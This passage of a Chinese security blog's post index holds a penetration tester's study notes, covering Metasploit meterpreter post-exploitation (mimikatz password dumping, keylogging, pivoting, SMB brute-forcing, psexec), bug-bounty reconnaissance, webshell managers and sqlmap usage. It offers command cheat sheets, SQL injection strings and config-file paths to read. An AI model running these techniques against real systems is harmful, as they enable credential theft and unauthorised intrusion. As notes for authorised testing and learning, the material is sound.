+    <url>/2020/03/22/msf%E4%B9%8Bmeterpreter/</url>
+    <content><![CDATA[<h1 id="明文密码和HASH获取"><a href="#明文密码和HASH获取" class="headerlink" title="明文密码和HASH获取"></a>明文密码和HASH获取</h1><ul>
+<li>绕过UAC之后，如果目标已经登录过，没有关机或者没有重启后没有用户登录的话，是可以直接从内存里面获取到机器的明文密码。</li>
+</ul>
+<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
+<li>绕过UAC，反弹获得meterpreter以后，首先执行hashdump。</li>
+<li>加载模块，load mimikatz</li>
+<li>执行wdigest，获取明文密码。如果不行，尝试执行kerberos或者msv命令</li>
+</ul>
+<h1 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h1><h2 id="手动迁移"><a href="#手动迁移" class="headerlink" title="手动迁移"></a>手动迁移</h2><ul>
+<li>监听的时候 set exitonsession false，exploit -j -z，反弹的时候就不会退出监听。</li>
+<li>sessions查看会话，sessions+id打开会话。</li>
+<li>使用ps命令列出所有进程，getpid查看当前exp进程pid，一般进程都选择迁移到任务管理器进程。</li>
+<li>执行migrate -N explorer.exe。或migrate -P pid。  迁移完成后原进程会自动退出。高权限可以往低权限迁移，低权限不能往高权限迁。</li>
+</ul>
+<h2 id="上线自动迁移"><a href="#上线自动迁移" class="headerlink" title="上线自动迁移"></a>上线自动迁移</h2><ul>
+<li>执行exploit之前设置 set autorunscript migrate - n explorer.exe</li>
+<li>或者执行set AutoRunScript migrate -f，msf会自动选择一个进程进行迁移</li>
+</ul>
+<h1 id="各类操作"><a href="#各类操作" class="headerlink" title="各类操作"></a>各类操作</h1><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><ul>
+<li>keyscan_start</li>
+<li>keyscan_dump</li>
+<li>keyboard_send 对目标机器进行键盘输入</li>
+</ul>
+<h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><ul>
+<li>screenshot</li>
+</ul>
+<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><ul>
+<li>上传：upload /root/xf.php c:\xf.php</li>
+<li>下载： download c:/xf.php /root/1.php</li>
+<li>cat 文件名 查看文件</li>
+<li>edit c:/xf.php 编辑文件</li>
+<li>cd c: / 切换工作目录</li>
+</ul>
+<h2 id="加载语言终端"><a href="#加载语言终端" class="headerlink" title="加载语言终端"></a>加载语言终端</h2><ul>
+<li>load -l 列出能加载的语言终端</li>
+<li>load powershell。加载</li>
+<li>具体操作在官网看看。</li>
+</ul>
+<h1 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h1><p>##获取网段</p>
+<ul>
+<li>shell  –&gt;  ipconfig</li>
+<li>run get_local_subnets</li>
+<li>route list</li>
+</ul>
+<h2 id="添加路由-1"><a href="#添加路由-1" class="headerlink" title="添加路由"></a>添加路由</h2><p>把自己的机器添加进目标主机路由才能对内网进行操作</p>
+<ul>
+<li>run autoroute -s 192.168.0.0</li>
+<li>backgroup –&gt; route add 192.168.0.0 255.255.255.0 1</li>
+<li>arp扫描 run arp_scanner -r 192.168.0.0/24</li>
+</ul>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ul>
+<li>search portscan</li>
+<li>use auxiliary/scanner/portscan/syn  （use 5）</li>
+<li>setg rhost 192.168.0.0/24 (setg设置全局参数)</li>
+<li>set threads 20 </li>
+<li>set rhost Interrupt: use the quit</li>
+<li>set ports 445 </li>
+<li>exploit</li>
+</ul>
+<h1 id="SMB密码爆破"><a href="#SMB密码爆破" class="headerlink" title="SMB密码爆破"></a>SMB密码爆破</h1><ul>
+<li>首先扫描开放了445端口的主机</li>
+<li>use auxiliary/scanner/smb/smb_login</li>
+<li>set smbuser administrator   (set USER_FILE /root/user.dic)</li>
+<li>set smbpass admin  (set USERPASS_FILE /root/pass.dic)</li>
+<li>set rhosts file:/root/host.dic</li>
+<li>exploit</li>
+</ul>
+<h1 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h1><ul>
+<li>search psxec</li>
+<li>use auxiliary/admin/smb/psexec_command</li>
+<li>set command whoami</li>
+<li>set rhosts 192.168.0.19</li>
+<li>set smbuser administrator</li>
+<li>set smbpass admin</li>
+<li>exploit</li>
+</ul>
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><ul>
+<li><p>一般应用在无法直接连接某个端口的情况下</p>
+</li>
+<li><p>portfwd add -l 6666 -p 3389 -r 127.0.0.1(也可换成内网其他主机ip)</p>
+<p>将目标机器的3389端口转发到装了msf的vps的6666端口上</p>
+</li>
+<li><p>转发完之后删除  add改成delete</p>
+</li>
+</ul>
+<h1 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h1><ul>
+<li>不支持ICMP和ARP协议。</li>
+<li>socks5比socks4a支持的协议更多</li>
+</ul>
+<h2 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
+<li>首先添加路由关联到session上</li>
+<li>search socks</li>
+<li>use auxiliary/server/socks4a</li>
+<li>set STVHOST 127.0.0.1</li>
+<li>set SRVPOST  10808</li>
+<li>exploit</li>
+<li>架设完socks代理以后，使用代理需要结合proxychains</li>
+<li>打开proxychains配置文件把端口改成刚才设置的</li>
+<li>proxychains nmap -Pn -sT 192.168.0.19</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>msf</tag>
+        <tag>meterpreter</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SRC实战</title>
+    <url>/2020/03/06/SRC%E5%AE%9E%E6%88%98/</url>
+    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2><ul>
+<li><p>旁站：同一服务器的其他站点</p>
+<ul>
+<li><p>查询原理：</p>
+<p>DNS解析记录</p>
+</li>
+<li><p>在线网站：</p>
+<p><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a></p>
+<p><a href="https://www.webscan.cc/" target="_blank" rel="noopener">https://www.webscan.cc/</a></p>
+<p><a href="https://viewdns.info/reverseip/" target="_blank" rel="noopener">https://viewdns.info/reverseip/</a></p>
+<p><a href="https://reverseip.domaintools.com/" target="_blank" rel="noopener">https://reverseip.domaintools.com/</a></p>
+</li>
+<li><p>注意：</p>
+<ul>
+<li>通过查询得到的不一定是真实的，有可能站点已经迁移</li>
+<li>渗透进旁站以后不一定能跨目录操作，需要进行提权</li>
+</ul>
+<p>​</p>
+</li>
+</ul>
+</li>
+<li><p>C段：同一网段的不同服务器</p>
+<ul>
+<li>在线查询或用工具</li>
+</ul>
+</li>
+</ul>
+<h2 id="绕过CDN查找真实IP"><a href="#绕过CDN查找真实IP" class="headerlink" title="绕过CDN查找真实IP"></a>绕过CDN查找真实IP</h2><ul>
+<li><p>如何判断目标站点是否使用了CDN：多地ping（站长工具）、nslookup。</p>
+</li>
+<li><p>绕过方法：</p>
+<ul>
+<li><p>让对方发邮件，查看邮件的源代码。（rss邮件订阅…）</p>
+</li>
+<li><p>DNS缓存查询：</p>
+<p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a></p>
+<p><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></p>
+</li>
+<li><p>利用网站漏洞：xss，csrf</p>
+</li>
+<li><p>查询子域名ip</p>
+</li>
+<li><p>国外线路访问</p>
+</li>
+<li><p>搜索引擎：zoomeye，fofa，shodan</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="敏感路径和接口"><a href="#敏感路径和接口" class="headerlink" title="敏感路径和接口"></a>敏感路径和接口</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul>
+<li>未授权直接访问的登录页面</li>
+<li>无需登录可操作的上传页面</li>
+<li>编辑器</li>
+<li>后台</li>
+<li>历史版本</li>
+<li>错误页面</li>
+<li>phpinfo</li>
+</ul>
+<h3 id="如何寻找"><a href="#如何寻找" class="headerlink" title="如何寻找"></a>如何寻找</h3><ul>
+<li><p>目录扫描(御剑，dirbuster，burp)</p>
+</li>
+<li><p>wfuzz</p>
+<ul>
+<li><code>wfuzz -w /root/FuzzDicts/directoryDicts/en_dirctories_all.txt -w /root/FuzzDicts/directoryDicts/php/phpFileName.txt http://192.168.0.102/wordpress/FUZZ/FUZ2Z</code></li>
+</ul>
+<p>过滤参数：</p>
+<p>–hc(code)<br>–hl(line)<br>–hw(word)<br>–hh(char)</p>
+<ul>
+<li><p><code>wfuzz -w wordlist --hc 404 URL/FUZZ</code></p>
+</li>
+<li><p><code>wfuzz -w wordlist --hs &quot;Not Found&quot; URL/FUZZ</code></p>
+</li>
+</ul>
+</li>
+<li><p>在JS文件中寻找敏感接口</p>
+<p><a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p>
+<p><a href="https://github.com/m4ll0k/BurpSuite-Secret_Finder" target="_blank" rel="noopener">https://github.com/m4ll0k/BurpSuite-Secret_Finder</a></p>
+<p><a href="https://github.com/GerbenJavado/LinkFinder" target="_blank" rel="noopener">https://github.com/GerbenJavado/LinkFinder</a></p>
+<p>得到403或者404页面以后可以对该页面再进行一次fuzz，利用参数拼接得到完整地址，测试隐藏的接口。</p>
+<p>参考：</p>
+<p><a href="https://www.anquanke.com/post/id/86232" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86232</a><br><a href="https://www.secpulse.com/archives/35877.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35877.html</a><br><a href="https://www.uedbox.com/post/43499/" target="_blank" rel="noopener">https://www.uedbox.com/post/43499/</a></p>
+</li>
+<li><p>IIS短文件名漏洞</p>
+<p><a href="https://blog.csdn.net/weixin_39190897/article/details/88031228" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39190897/article/details/88031228</a></p>
+</li>
+<li><p>报错信息</p>
+<ul>
+<li><p>单引号爆路径   id=1‘</p>
+</li>
+<li><p>错误参数爆路径  id=-1，id[]=123</p>
+</li>
+<li><p>注入点可读取文件</p>
+<p>Windows：<br>c:\windows\php.ini php配置文件<br>c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件<br>Linux:<br>/etc/php.ini php配置⽂件<br>/etc/httpd/conf.d/php.conf<br>/etc/httpd/conf/httpd.conf Apache配置⽂件<br>/usr/local/apache/conf/httpd.conf<br>/usr/local/apache2/conf/httpd.conf<br>/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置⽂件</p>
+</li>
+<li><p>修改请求方法为put</p>
+</li>
+<li><p>搜索引擎搜索错误页面或测试页面</p>
+<p>test.php<br>ceshi.php<br>info.php<br>phpinfo.php<br>php_info.php<br>1.php<br>Site:xxx.com error<br>Site:xxx.com warning<br>Site:xxx.com “fatal error”</p>
+</li>
+<li><p>组件特性：</p>
+<ul>
+<li><p>Apache样例文件泄露：</p>
+<p><a href="http://xxx.com/examples/servlets/servlet/CookieExample" target="_blank" rel="noopener">http://xxx.com/examples/servlets/servlet/CookieExample</a></p>
+<p><a href="http://xxx.com/examples/servlets/servlet/RequestHeaderExample" target="_blank" rel="noopener">http://xxx.com/examples/servlets/servlet/RequestHeaderExample</a></p>
+<p><a href="http://xxx.com/examples/jsp/snp/snoop.jsp" target="_blank" rel="noopener">http://xxx.com/examples/jsp/snp/snoop.jsp</a></p>
+<p><a href="http://xxx.com/examples/async/async1" target="_blank" rel="noopener">http://xxx.com/examples/async/async1</a></p>
+</li>
+<li><p>War文件信息泄露</p>
+<p>config/config.properties<br>configure/configure.properties<br>applicationContext.xml<br>sysconfig.properties<br>web.xml<br>config.xml<br>jdbc.properties</p>
+</li>
+<li><p>Swagger</p>
+<p>/swagger-ui.html<br>/swagger/swagger-ui.html<br>/api/swagger-ui.html<br>/v1.x/swagger-ui.html<br>/swagger/index.html</p>
+</li>
+<li><p>Tomcat</p>
+<p>jsp文件后缀改成大写，会显示源码</p>
+</li>
+<li><p>Nginx文件离线错误解析爆路劲</p>
+<p>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，还有可能爆出物理路径。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><h3 id="版本控制器造成的源码泄露"><a href="#版本控制器造成的源码泄露" class="headerlink" title="版本控制器造成的源码泄露"></a>版本控制器造成的源码泄露</h3><ul>
+<li><p>SVN源码泄露（.SVN隐藏文件）</p>
+<p>测试工具：Seay-SVN</p>
+</li>
+<li><p>Git源码泄露（.git隐藏文件）</p>
+<p>测试工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p>
+<p>​           <a href="https://github.com/BugScanTeam/GitHack" target="_blank" rel="noopener">https://github.com/BugScanTeam/GitHack</a></p>
+</li>
+<li><p>.DS_Store文件造成泄露</p>
+<p>.DS_Store是mac下finder用来保存如何展示文件/文件夹的数据文件，每个文件夹下对应一个，用来存储当前文件夹下的属性。</p>
+<p>测试工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a></p>
+</li>
+<li><p>WEB-INF/web.xml泄露</p>
+<p>WEB-INF是JAVA的WEB应用安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
+</li>
+<li><p>网站备份压缩文件</p>
+</li>
+<li><p>在线网盘造成源码泄露</p>
+<ul>
+<li>百度云…</li>
+<li>github</li>
+</ul>
+</li>
+</ul>
+<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="SQL注入挖掘"><a href="#SQL注入挖掘" class="headerlink" title="SQL注入挖掘"></a>SQL注入挖掘</h2><ul>
+<li><p>出现场景：</p>
+<ul>
+<li><p>动态请求：?id=1</p>
+</li>
+<li><p>搜索框：a%’ and ‘1’=’1’ #</p>
+</li>
+<li><p>填写注册信息</p>
+<p>insert into member(username,pw,sex,phonenum,email,address) values(‘{$getdata[‘username’]}’,md5(‘{$getdata[‘password’]}’),’{$getdata[‘sex’]}’,’{$getdata[‘phonenum’]}’,’{$getdata[‘email’]}’,’{$getdata[‘add’]}’);</p>
+</li>
+<li><p>修改信息</p>
+<p>update member set sex=’{$getdata[‘sex’]}’,phonenum=’{$getdata[‘phonenum’]}’,address=’{$getdata[‘add’]}’,email=’{$getdata[‘email’]}’ where username=’{$_SESSION[‘sqli’][‘username’]}’;</p>
+</li>
+<li><p>删除</p>
+</li>
+<li><p>登录</p>
+</li>
+<li><p>HTTP头注入</p>
+<p>insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values(‘$is_login_id’,’$remoteipadd’,’$useragent’,’$httpaccept’,’$remoteport’);</p>
+</li>
+</ul>
+</li>
+<li><p>挖掘流程：</p>
+<ul>
+<li>判断存在注入点</li>
+<li>信息获取</li>
+<li>权限获取</li>
+</ul>
+</li>
+</ul>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="类型-1"><a href="#类型-1" class="headerlink" title="类型"></a>类型</h3><ul>
+<li><p>高频用户名、密码</p>
+</li>
+<li><p>根据网站，个人特性生成密码字典</p>
+<p><a href="http://ximcx.cn/caimima/" target="_blank" rel="noopener">http://ximcx.cn/caimima/</a></p>
+</li>
+<li><p>业务上线前的测试账号</p>
+<p>test  123456</p>
+<p>test  test</p>
+<p>test  000000</p>
+</li>
+<li><p>web组件和服务的弱口令</p>
+<p>weblogic</p>
+<p>tomcat</p>
+<p>ssh</p>
+<p>ftp</p>
+</li>
+<li><p>路由器和安全设备的弱口令</p>
+</li>
+</ul>
+<h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><ul>
+<li><p>常规爆破</p>
+</li>
+<li><p>遇到验证码时，用pkav，tesserocr，打码平台</p>
+<p>安装tesseract</p>
+<p><a href="https://digi.bib.uni-mannheim.de/tesseract/" target="_blank" rel="noopener">https://digi.bib.uni-mannheim.de/tesseract/</a></p>
+<p>安装完成后配置环境变量</p>
+<p>安装tesserocr</p>
+<p><a href="https://github.com/simonflueckiger/tesserocr-windows_build/releases" target="_blank" rel="noopener">https://github.com/simonflueckiger/tesserocr-windows_build/releases</a></p>
+<p>pip install wheel<br>pip install G:\tesserocr-2.4.0-cp37-cp37m-win_amd64.whl</p>
+<p>复制tessdata文件</p>
+<p>tessdata 文件复制到你的python安装路径的根目录下</p>
+<p>其他问题</p>
+<p><a href="https://www.jb51.net/article/157487.htm" target="_blank" rel="noopener">https://www.jb51.net/article/157487.htm</a></p>
+<p>python调用tesserocr</p>
+<p>打码平台</p>
+<p><a href="https://blog.csdn.net/zwq912318834/article/details/78616462" target="_blank" rel="noopener">https://blog.csdn.net/zwq912318834/article/details/78616462</a><br><a href="https://www.cnblogs.com/ftl1012/p/10327783.html" target="_blank" rel="noopener">https://www.cnblogs.com/ftl1012/p/10327783.html</a></p>
+</li>
+<li><p>遇token时，带上token爆破</p>
+<p>用burp的recursive grep设置payload</p>
+</li>
+<li><p>登录口令加密传输</p>
+<p>在burp里设置payload processing rule</p>
+</li>
+</ul>
+<h3 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a>一些知识点</h3><ul>
+<li><p>验证账号是否存在。</p>
+<p>输入不同账号看返回结果是否一致</p>
+</li>
+<li><p>IP次数限制</p>
+<p>fake IP：<a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/burpFakeIP</a></p>
+<p><a href="https://www.jython.org/" target="_blank" rel="noopener">https://www.jython.org/</a>   下载jpython-standalone</p>
+<p>IP代理池（成本高）</p>
+</li>
+<li><p>登录使用手册、说明、网站源码注释可能有默认密码</p>
+</li>
+<li><p>fuzz参数 /user/$login.php$</p>
+</li>
+</ul>
+<h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><p><a href="https://blog.csdn.net/lowhacker/article/details/89608196" target="_blank" rel="noopener">https://blog.csdn.net/lowhacker/article/details/89608196</a></p>
+<p><a href="https://blog.csdn.net/geekwei/article/details/70767727" target="_blank" rel="noopener">https://blog.csdn.net/geekwei/article/details/70767727</a></p>
+]]></content>
+      <tags>
+        <tag>SRC</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>webshell管理工具</title>
+    <url>/2020/02/21/webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h1 id="中国菜刀（China-chopper）"><a href="#中国菜刀（China-chopper）" class="headerlink" title="中国菜刀（China chopper）"></a>中国菜刀（China chopper）</h1><h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><ul>
+<li>上传webshell的时候注意编码格式，一般选用UTF-8。连接的时候也可选择，匹配就行。打开中文文件乱码就改成GB2312再连接。</li>
+<li>用webshell进行文件管理的时候出错一般是权限问题。权限继承于解析器（web容器，web服务器），这些解析器的权限是管理员配置的。Apache默认是system|administrator权限，Nginx，IIS，Tengine默认是Network Service（NT Service）。权限低的时候，比如freehost虚拟主机，除了网站本身的目录其他都不能访问。</li>
+<li>访问目录以后中国菜刀会自动缓存网页的目录结构，即使以后webshell掉线也依然能查看到。网站变更以后再用webshell访问需要清空缓存。</li>
+<li>如果上传文件失败或者文件过大，可以通过下载的方式从远程服务器下载文件到网站目录。文件上传或下载要注意编码格式。</li>
+<li>下载文件建议不下载过大的文件，如果要下载，可以将文件复制到网站根目录，然后用浏览器访问该文件下载。这样比用菜刀下载要快很多。大文件的复制最好使用命令行copy过去，用菜刀的虚拟终端执行命令。</li>
+</ul>
+<h2 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h2><ul>
+<li>进去以后要点一下配置，可以选择数据库连接类型以及一些连接配置，一般数据库的配置在网站目录下的config文件里能找到。提交正确的配置以后，菜刀会根据你的权限列出所有能操作的表。</li>
+<li>通过双击表名或者字段名菜刀会写好查询语句，点一下执行就可以查看数据。也可以自己修改sql语句执行。双击列出的数据可以对内容进行修改、复制等操作。右键可以导出数据，切记不能乱脱库。</li>
+</ul>
+<h2 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h2><ul>
+<li>这个是模拟电脑的cmdshell，但其实是不交互的，不执行交互式命令。</li>
+</ul>
+<h2 id="自写脚本"><a href="#自写脚本" class="headerlink" title="自写脚本"></a>自写脚本</h2><ul>
+<li>用的不多</li>
+</ul>
+<h2 id="后门问题"><a href="#后门问题" class="headerlink" title="后门问题"></a>后门问题</h2><ul>
+<li>到github上下载应该不会有问题  <a href="https://github.com/raddyfiy/caidao-official-version" target="_blank" rel="noopener">https://github.com/raddyfiy/caidao-official-version</a></li>
+</ul>
+<h1 id="K8飞刀"><a href="#K8飞刀" class="headerlink" title="K8飞刀"></a>K8飞刀</h1><ul>
+<li>下载链接：<a href="https://www.github.com/k8gege/k8tools/" target="_blank" rel="noopener">https://www.github.com/k8gege/k8tools/</a>  解压密码：k8gege/k8team</li>
+<li>webshell连接方式增加了几种其他的shell，PHP脚本支持UA，cookie等一句话连接。</li>
+<li>文件管理方面不如菜刀方便，不能显示目录结构，其他方面都差不多。</li>
+<li>其他方面cookie修改功能还比较方便，exp用来检测利用特定CMS漏洞，也可以自行添加exp。</li>
+</ul>
+<h1 id="开山斧"><a href="#开山斧" class="headerlink" title="开山斧"></a>开山斧</h1><ul>
+<li>下载链接：<a href="https://github.com/pyqteval/evlal_win" target="_blank" rel="noopener">https://github.com/pyqteval/evlal_win</a></li>
+<li>文件管理方面比较美观，有图标和文件属性，功能上和菜刀差不多。</li>
+<li>修改文件时间功能好像有点问题。</li>
+<li>虚拟终端参数不能删除掉，但是可以修改参数里的目录。cmd参数修改提权里才会用到。终端对中文的显示比较好。</li>
+<li>webshell管理页面可以批量测试webshell是否存活。</li>
+</ul>
+<h1 id="Cknife"><a href="#Cknife" class="headerlink" title="Cknife"></a>Cknife</h1><ul>
+<li><p>下载链接：</p>
+<p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p>
+<p><a href="https://github.com/Ch1ngg/CknifeModifyVersion" target="_blank" rel="noopener">https://github.com/Ch1ngg/CknifeModifyVersion</a>  </p>
+</li>
+<li><p>支持代理和自定义请求头</p>
+</li>
+<li><p>waf绕过功能可高度自定义</p>
+</li>
+<li><p>打狗棒法之进阶篇：Cknife修改配置法秒过安全狗。<a href="http://www.ms509.com/2016/03/31/cknife-advanced/" target="_blank" rel="noopener">http://www.ms509.com/2016/03/31/cknife-advanced/</a></p>
+</li>
+</ul>
+<h1 id="AntSword（中国蚁剑）"><a href="#AntSword（中国蚁剑）" class="headerlink" title="AntSword（中国蚁剑）"></a>AntSword（中国蚁剑）</h1><ul>
+<li>下载链接：<ul>
+<li>加载器：<a href="https://github.com/AntSwordProject/AntSword-Loader" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-Loader</a></li>
+<li>源代码：<a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword</a></li>
+</ul>
+</li>
+<li>也可设置代理、请求头，自定义编码</li>
+<li>可以在特定目录进行cmd打开，界面比较美观</li>
+<li>书签功能就是保存一个路径方便返回</li>
+<li>数据库类型支持的比较多，功能比较全</li>
+<li>插件中心有很多插件，安装很方便</li>
+<li>可以加密传输流量，绕过waf拦截</li>
+</ul>
+<h1 id="冰蝎Behinder"><a href="#冰蝎Behinder" class="headerlink" title="冰蝎Behinder"></a>冰蝎Behinder</h1><ul>
+<li>链接：<a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></li>
+<li>自带的phpshell要开启openssl才能加密传输。版本和函数不一致的话会报错</li>
+<li>socks代理是监听的本地端口。</li>
+<li>不太好用。bug太多</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>基础学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入工具sqlmap的使用</title>
+    <url>/2020/02/20/sql%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="注入Access"><a href="#注入Access" class="headerlink" title="注入Access"></a>注入Access</h1><ul>
+<li>一般小型网站使用asp+Access</li>
+<li>Access的特性，没办法直接获取表名列名，只能通过暴力猜解。一般使用sqlmap自带的就行。</li>
+<li>一个小技巧，在网站后台页面查看登录框源码可能会有字段名出现。</li>
+</ul>
+<h2 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h2><ul>
+<li>-u 检测注入，–dbs 爆数据库，–curren-db 获取当前数据库，–tables 爆表名，–columns 爆列名，–dump爆数据，–start  1 –stop 2 指定第一条到第二条数据，测试一两条数据，挖src的时候不容易出事。</li>
+<li>拿到密码解密后可以登录后台，无后台可以用这个密码尝试登录远程桌面或者ftp服务</li>
+</ul>
+<h1 id="注入mysql"><a href="#注入mysql" class="headerlink" title="注入mysql"></a>注入mysql</h1><ul>
+<li>基础用法同上</li>
+</ul>
+<h1 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h1><ul>
+<li>-r参数，从一个文件里获取一个HTTP请求，这样就不需要对cookie等请求头参数进行设置。sqlmap会自己对这些参数进行测试  。sqlmap -r 文件物理路径</li>
+<li>-m参数，从文件里一条一条获取url，一个一个进行检测。也就是批量检测</li>
+<li>–cookie参数，有时候登录以后的注入要带上cookie才能检测。</li>
+<li>–radom-agent参数，随机更改user-agent，防止被识别出来。</li>
+<li>–proxy参数，使用代理，不使用真实ip，可以翻墙，也可以隐藏身份。</li>
+<li>–delay参数，设置两次请求之间的延时。防止请求速度过快被封。–delay 1</li>
+<li>–tamper参数，指定绕过脚本，对注入语句进行变形以达到绕过waf的目的。</li>
+<li>–technique参数，指定注入技术，B布尔，E报错，U联合，S堆叠，T时间。</li>
+<li>–risk参数，提高测试等级，最高为3。会增加测试语句。</li>
+<li>–lever参数，增加被测试的语句。</li>
+<li>–string参数，在正常的页面找一个错误页面没有的字符串，添加到参数后面帮助识别注入。注：在填写搜索关键词的时候，一定要找出那些能够搜索出内容的关键词，比如你在实战中搜索dark5，但是网站没有关于dark5的文章内容，就不会出现正常的搜索结果，这样我们把注入语句加在dark5的后面时，是没有办法判断我们的SQL语句是否成功执行，就没有办法达到我们想要的结果了。还有的网站使用ajax，有时候真正的请求会在后面，需要通过抓包来判断</li>
+<li>*，这个参数用来指定测试语句位置，通常用于伪静态页面，也可用于正常页面增加效率。文章：<a href="https://www.cnblogs.com/ximotao/p/5870274.html" target="_blank" rel="noopener">https://www.cnblogs.com/ximotao/p/5870274.html</a></li>
+</ul>
+<h2 id="sqlmap进行oob注入"><a href="#sqlmap进行oob注入" class="headerlink" title="sqlmap进行oob注入"></a>sqlmap进行oob注入</h2><ul>
+<li>看看大佬写的过程  <a href="https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md#sqlmap%E9%85%8D%E5%90%88dnslog" target="_blank" rel="noopener">https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md#sqlmap%E9%85%8D%E5%90%88dnslog</a></li>
+</ul>
+<h2 id="注入伪静态"><a href="#注入伪静态" class="headerlink" title="注入伪静态"></a>注入伪静态</h2><ul>
+<li>用sqlmap在注入点处加个*即可</li>
+</ul>
+<h2 id="sqlmap处理高权限MSSQL注入"><a href="#sqlmap处理高权限MSSQL注入" class="headerlink" title="sqlmap处理高权限MSSQL注入"></a>sqlmap处理高权限MSSQL注入</h2><ul>
+<li>–curren-user 查看当前用户</li>
+<li>– is-dba 查看当前用户是否是数据库管理员权限用户</li>
+<li>–os-shell 使用存储过程，执行系统命令 </li>
+<li>–sql-shell 权限不够大时可以执行一些数据库命令</li>
+<li>–os-pwn –msf-path  /…/metasploit  配合msf</li>
+</ul>
+<h2 id="sqlmap处理高权限MYSQL注入"><a href="#sqlmap处理高权限MYSQL注入" class="headerlink" title="sqlmap处理高权限MYSQL注入"></a>sqlmap处理高权限MYSQL注入</h2><ul>
+<li>能爆出物理路径，基本流程同上</li>
+<li>没爆出路径只能自己爆破了</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>实战相关</title>
+    <url>/2020/03/01/%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="基于PHPMyadmin的攻击"><a href="#基于PHPMyadmin的攻击" class="headerlink" title="基于PHPMyadmin的攻击"></a>基于PHPMyadmin的攻击</h1><h2 id="入口寻找"><a href="#入口寻找" class="headerlink" title="入口寻找"></a>入口寻找</h2><ol>
+<li>目录扫描（linux大小写敏感，字典里需要区分）</li>
+<li>CMS特性</li>
+<li>google hacking</li>
+<li>网站自带功能</li>
+</ol>
